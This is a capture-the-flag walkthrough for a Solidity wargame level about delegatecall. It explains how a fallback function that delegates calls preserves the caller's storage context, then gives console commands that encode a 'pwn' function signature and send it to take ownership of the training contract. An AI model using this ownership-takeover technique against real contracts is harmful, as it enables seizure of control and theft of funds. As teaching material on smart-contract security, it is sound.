# Level 6 - Delegate Call

## Important resources to undertand 
* [delegatecall](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
* [Fallback Function](https://solidity-by-example.org/fallback/)

### Key points to remember
* In simple terms delegatecall keeps the context of the caller contract when executing the called contract, see the pictures below to understand the difference call() and delegatecall()
![Call](https://miro.medium.com/max/4800/1*PwYIsFyDM60IW4KuDkUncA.png "Call() Exection State")
![DelegateCall](https://miro.medium.com/max/4800/1*4OB3IwTF1AkW6zH3tJv8Tw.png "DelegateCall() Exection State")
* Call/ DelegateCall are used to call functions of contract without knowing the actuall functions

### Solution

In your console do, all this is doing is essentially [encoding](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8) the function name to be called by the delegation

`let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});`

Next step is to pass the payload created above to call the fallback function (sending a transaction to the contract will trigger the fallback function with the delegate call in delegation)

`await contract.sendTransaction({
    data: payload
});
`

Now try `await contract.owner()` your address should be the owner now
